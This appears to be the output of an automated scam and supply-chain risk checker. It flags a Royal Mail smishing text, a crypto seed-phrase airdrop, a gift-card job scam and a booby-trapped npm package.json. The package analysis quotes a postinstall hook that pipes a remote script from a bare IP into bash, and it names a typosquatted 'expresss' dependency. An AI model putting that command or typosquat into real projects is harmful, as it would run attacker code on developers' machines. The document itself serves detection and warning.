ROYAL MAIL: Your parcel has a £1.99 unpa.title: Fake Royal Mail Redelivery Text — Phishing Scam
ROYAL MAIL: Your parcel has a £1.99 unpa.summary: This message impersonates Royal Mail using a look-alike domain to pressure you into paying a small fee, a classic smishing scam designed to steal your card details.

red_flags.label: Brand impersonation with fake domain
red_flags.detail: The domain 'royalmail-redelivery.info' uses the Royal Mail name but is confirmed not to be an official Royal Mail domain.

red_flags.label: Suspicious TLD
red_flags.detail: The .info TLD is frequently abused by scam and phishing sites, as flagged by heuristic checks.

red_flags.label: Urgency pressure
red_flags.detail: The message demands payment 'within 24h or it returns to sender' to rush you into acting without thinking.

red_flags.label: Small unpaid fee lure
red_flags.detail: Asking for a trivially small amount like £1.99 is a common tactic to lower your guard while harvesting card details.

red_flags.label: Unsolicited contact with payment link
red_flags.detail: Legitimate parcel services rarely ask for outstanding fees via unsolicited text links to pay.

recommended_actions: Do not click the link or enter any payment or personal details.
Delete the text message and block the sender number.
If you're expecting a parcel, check tracking directly via the official Royal Mail website (royalmail.com) or app, not via this link.
Report the message to your mobile carrier (forward to 7726 in the UK) and to Action Fraud (actionfraud.police.uk).
If you already entered card details, contact your bank immediately to cancel the card and monitor for fraud.
ROYAL MAIL: Your parcel has a £1.99 unpa.disclaimer: This is automated risk guidance, not a guarantee of safety or fraud. Always verify independently through official channels before taking action.

evidence.claim: Uses a TLD (.info) frequently abused by scam sites
evidence.subject: https://royalmail-redelivery.info/pay

evidence.claim: Domain "royalmail-redelivery.info" uses the Royal Mail name but is not an official Royal Mail domain
evidence.subject: royalmail-redelivery.info

🎉 You are eligible for the OKB community.title: Fake OKB Airdrop — Seed Phrase Phishing Scam
🎉 You are eligible for the OKB community.summary: This message is a classic crypto drainer scam: it dangles a free token reward and then asks you to 'verify your seed phrase,' which would let scammers instantly steal everything in your wallet.

red_flags.label: Seed phrase request
red_flags.detail: The message asks you to 'verify your seed phrase to receive tokens' — no legitimate airdrop or exchange ever needs your seed phrase; this is the single biggest red flag for wallet-draining scams.

red_flags.label: Unsolicited too-good-to-be-true reward
red_flags.detail: Claiming you are randomly 'eligible' for 2,500 OKB tokens with no prior action on your part is a typical too-good-to-be-true lure.

red_flags.label: Urgency pressure
red_flags.detail: The phrase 'claim before it expires' is designed to rush you into acting without thinking it through.

red_flags.label: Suspicious domain
red_flags.detail: The domain okb-airdrop-claim.xyz is heavily hyphenated and impersonates the OKB brand, a common pattern in phishing sites (verified heuristic).

red_flags.label: Abused TLD
red_flags.detail: The .xyz TLD is frequently used by scam and phishing sites due to its low cost and lax registration requirements (verified heuristic).

red_flags.label: Wallet connection request
red_flags.detail: Being asked to 'connect your wallet' to an unknown, unverified site to claim a reward is a hallmark of wallet-drainer scams.

recommended_actions: Do not click the link or connect your wallet to this site.
Never share your seed phrase or private key with anyone or any website — no legitimate service will ever ask for it.
If you already entered your seed phrase anywhere suspicious, immediately move your funds to a new wallet with a freshly generated seed phrase.
Report and block the message/site, and warn others if you received this via social media or DM.
Only get airdrop information from official, verified OKX/OKB channels — type the URL directly rather than clicking links.
🎉 You are eligible for the OKB community.disclaimer: This assessment is risk guidance based on available information and automated checks, not a guarantee. Always verify independently through official channels before taking any action, especially anything involving your seed phrase, private keys, or wallet connections.

evidence.claim: Domain name is heavily hyphenated (okb-airdrop-claim.xyz) — common in brand-spoofing
evidence.subject: https://okb-airdrop-claim.xyz

evidence.claim: Uses a TLD (.xyz) frequently abused by scam sites
evidence.subject: https://okb-airdrop-claim.xyz

Hi! We reviewed your profile and want to.title: Fake Job Offer Demanding Gift Card Payment
Hi! We reviewed your profile and want to.summary: This is a classic job scam: no legitimate employer hires without an interview, pays absurdly high wages for data entry, or asks for upfront payment via gift card codes.

red_flags.label: Too-good-to-be-true pay
red_flags.detail: $450/day for unskilled 'data-entry' work with no interview is wildly unrealistic and a common scam lure.

red_flags.label: No interview or vetting process
red_flags.detail: Legitimate employers almost never hire without any interview or verification process.

red_flags.label: Upfront payment request
red_flags.detail: Asking for a $50 'refundable equipment deposit' before starting work is a hallmark of advance-fee fraud.

red_flags.label: Gift card payment method
red_flags.detail: Requesting payment via gift card code is a major red flag — gift cards are untraceable and instantly cashed out by scammers, and no real employer or vendor uses this method.

red_flags.label: Unsolicited contact
red_flags.detail: The offer claims they 'reviewed your profile' with no context on which platform or how, suggesting a mass-sent scam message.

recommended_actions: Do not send any gift card codes or payment of any kind to this sender.
Do not provide personal information, banking details, or ID documents.
Block and report the sender on whatever platform contacted you.
Report this to the FTC (reportfraud.ftc.gov) or your country's equivalent consumer protection agency.
If you already sent a gift card code, contact the retailer immediately — recovery is unlikely but sometimes possible if reported fast.
Hi! We reviewed your profile and want to.disclaimer: This assessment is risk guidance based on common scam patterns, not a guarantee. Always verify independently and never send money, gift cards, or personal information to unverified job offers.

{\"name\":\"frontend-take-home\",\"scrip.title: Malicious postinstall script downloads and executes remote payload on npm install
{\"name\":\"frontend-take-home\",\"scrip.summary: This package.json runs a postinstall hook that pipes a remote shell script straight into bash, and also includes a typosquatted package and a dependency pulled from a random GitHub repo instead of npm — classic 'Contagious Interview' fake take-home malware pattern.

red_flags.label: Fetch-and-execute postinstall hook
red_flags.detail: The postinstall script runs `curl -s http://185.62.190.10/loader.sh | bash`, downloading and executing an arbitrary remote script the instant `npm install` runs, with no review possible beforehand.

red_flags.label: Raw IP address as download source
red_flags.detail: The payload is fetched from a bare IP (185.62.190.10) rather than a domain, a strong indicator of throwaway malicious infrastructure with no attribution.

red_flags.label: Typosquatted dependency 'expresss'
red_flags.detail: The dependency 'expresss' (triple 's') mimics the extremely popular 'express' package, a common trick to get developers to unknowingly install a malicious lookalike.

red_flags.label: Non-registry git dependency
red_flags.detail: 'auth-helper-utils' is installed directly from git+https://github.com/x9f2/auth-helper.git, bypassing npm registry vetting and allowing the maintainer to change code at will without version pinning or review.

red_flags.label: Fake take-home project framing
red_flags.detail: The package name 'frontend-take-home' matches the known 'Contagious Interview' social-engineering pattern where fake recruiters send booby-trapped take-home tests to steal credentials/wallets.

recommended_actions: Do NOT run `npm install` or any install command on this repository.
Do not open this project in an environment with access to real credentials, SSH keys, or crypto wallets.
If you already ran install, immediately rotate all credentials, SSH/API keys, and consider the machine compromised; check for persistence mechanisms.
Inspect loader.sh contents (via a sandboxed VM/network capture) if you need to confirm behavior, but do not execute it on a real machine.
Report the suspicious 'recruiter'/repo source and the IP 185.62.190.10 to relevant platforms.

If you still need the take-home content, extract only the source files manually without running any install scripts, and use `npm install --ignore-scripts` inside a disposable, network-isolated container as an extra precaution.
Verify any dependency names carefully against the real npmjs.com package before ever adding them to a real project.
{\"name\":\"frontend-take-home\",\"scrip.disclaimer: This is automated risk guidance based on available signals, not a guarantee of maliciousness or safety; always verify independently before executing untrusted code.

evidence.claim: Script "postinstall" runs a high-risk command (fetch-and-execute / obfuscation): `curl -s http://185.62.190.10/loader.sh | bash`
evidence.subject: postinstall

evidence.claim: Dependency "auth-helper-utils" is pulled from a non-registry source (git+https://github.com/x9f2/auth-helper.git) — bypasses npm's registry
evidence.subject: auth-helper-utils

evidence.claim: Dependency "expresss" is a look-alike of the popular package "express" (possible typosquat)
evidence.subject: expresss

https://github.com/expressjs/express.title: No supply-chain red flags found in expressjs/express
https://github.com/expressjs/express.summary: This is the well-known Express.js web framework repository with standard, widely-used dependencies and no install scripts or malicious indicators detected.
recommended_actions: Still verify the repo URL matches the official github.com/expressjs/express before cloning.
Run npm install normally, but consider npm ci for reproducible installs in CI/production.
Periodically run npm audit to catch newly disclosed vulnerabilities in dependencies.
Pin dependency versions in production via a lockfile (package-lock.json) committed to the repo.
https://github.com/expressjs/express.disclaimer: This assessment is risk guidance based on available data, not a guarantee of safety; always verify independently and review dependencies before running installs, especially in sensitive environments.

Hey, running 10 mins late for lunch — gr.title: Ordinary casual text — no scam indicators
Hey, running 10 mins late for lunch — gr.summary: This is a normal, low-stakes message about being late to lunch, with no requests for money, personal information, or links.
recommended_actions: No action needed — this message shows no signs of fraud.
If this is unexpected or from an unknown number, confirm the sender's identity before responding, just as a general precaution.
Hey, running 10 mins late for lunch — gr.disclaimer: This assessment is risk guidance based on the text provided, not a guarantee of safety. Always use your own judgment and verify independently if anything about the context seems off.
